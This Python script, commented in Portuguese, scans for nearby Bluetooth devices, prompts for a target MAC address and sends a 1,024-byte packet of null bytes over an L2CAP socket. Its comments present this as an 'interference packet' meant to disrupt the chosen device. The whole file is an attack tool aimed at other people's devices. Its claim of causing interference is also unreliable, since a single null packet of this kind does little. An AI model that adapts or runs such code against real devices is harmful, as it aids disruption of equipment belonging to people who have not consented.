import bluetooth

def scan_bluetooth_devices():
    print("Procurando dispositivos Bluetooth...")
    devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=False)
    
    print(f"Encontrados {len(devices)} dispositivos.")
    for addr, name in devices:
        print(f"Endereço: {addr}, Nome: {name}")

def send_bluetooth_packet(target_address, packet):
    # Cria um socket Bluetooth
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)

    try:
        # Conecta ao dispositivo alvo
        sock.connect((target_address, 0x1001))

        # Envia o pacote
        sock.send(packet)
    except Exception as e:
        print(f"Falha ao enviar pacote: {e}")
    finally:
        # Fecha o socket
        sock.close()

def generate_interference_packet():
    # Gera um pacote que cria interferência
    # Este é um exemplo simples e pode precisar ser ajustado para uso real
    packet = b'\x00' * 1024  # Um pacote de 1024 bytes nulos
    return packet

def main():
    # Scan dos dispositivos 
    scan_bluetooth_devices()
    # Input dos endereços
    input_address = str(input("Insira o MAC Bluetooth correspondente: "))
    # Endereço Bluetooth de exemplo (substitua pelo endereço real)
    target_address = input_address 
    # Gera o pacote de interferência
    packet = generate_interference_packet()
    # Envia o pacote para o dispositivo alvo
    send_bluetooth_packet(target_address, packet)

if __name__ == "__main__":
    
    main()
